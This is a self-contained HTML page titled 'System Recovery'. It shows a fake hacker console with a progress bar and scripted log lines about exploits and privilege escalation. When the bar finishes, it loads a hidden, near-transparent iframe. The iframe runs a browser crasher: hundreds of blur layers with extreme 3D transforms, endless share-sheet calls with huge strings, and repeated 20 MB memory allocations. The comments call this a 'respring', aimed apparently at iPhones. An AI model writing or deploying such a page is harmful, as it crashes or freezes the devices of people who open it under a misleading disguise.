<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Recovery</title>
    <style>
        body {
            background: #000;
            color: #00ff00; /* Классический цвет консоли */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            text-align: left;
        }

        #ui-container {
            width: 80%;
            max-width: 400px;
        }

        #console {
            height: 150px;
            overflow: hidden;
            font-size: 12px;
            margin-bottom: 20px;
            display: flex;
            flex-direction: column-reverse;
        }

        .log-entry {
            margin-bottom: 5px;
            opacity: 0.8;
        }

        #progress-container {
            width: 100%;
            height: 10px;
            border: 1px solid #00ff00;
            background: #000;
            position: relative;
        }

        #progress-bar {
            width: 0%;
            height: 100%;
            background: #00ff00;
            transition: width 0.1s linear;
        }

        #fatal-error {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 10px;
            letter-spacing: 1px;
        }

        #respring-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.01; 
            pointer-events: none;
        }

        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 10px;
            color: #444;
        }
    </style>
</head>
<body>

    <div id="ui-container">
        <div id="console"></div>
        <div id="progress-container">
            <div id="progress-bar"></div>
        </div>
        <p id="status-text" style="font-size: 14px; margin-top: 10px;">Initializing...</p>
    </div>

    <div id="fatal-error">Fatal Error</div>

    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        const logs = [
            "Connecting to kernel...",
            "Checking filesystem...",
            "Loading exploit: m_core_3...",
            "Bypassing sandbox...",
            "Escalating privileges...",
            "Injecting payload...",
            "Memory corruption initiated...",
            "Clearing sys-logs...",
            "Finalizing exploit..."
        ];

        const consoleDiv = document.getElementById('console');
        const progressBar = document.getElementById('progress-bar');
        const statusText = document.getElementById('status-text');
        const uiContainer = document.getElementById('ui-container');
        const fatalError = document.getElementById('fatal-error');
        const frame = document.getElementById('respring-iframe');

        let progress = 0;
        let logIndex = 0;

        function addLog() {
            if (logIndex < logs.length) {
                const log = document.createElement('div');
                log.className = 'log-entry';
                log.innerText = `> ${logs[logIndex]}`;
                consoleDiv.prepend(log);
                logIndex++;
            }
        }

        function startRespring() {
            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }
                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript;
        }

        const interval = setInterval(() => {
            progress += Math.random() * 2;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                
                // Финальный переход
                uiContainer.style.display = 'none';
                fatalError.style.display = 'block';
                
                // Запуск твоего кода респринга
                setTimeout(startRespring, 500);
            }
            
            progressBar.style.width = progress + '%';
            statusText.innerText = `Processing: ${Math.floor(progress)}%`;
            
            if (Math.random() > 0.8) addLog();
        }, 100);

    </script>
    <div class="footer">© 2026 neonmodder123 | MIT License</div>
</body>
</html>
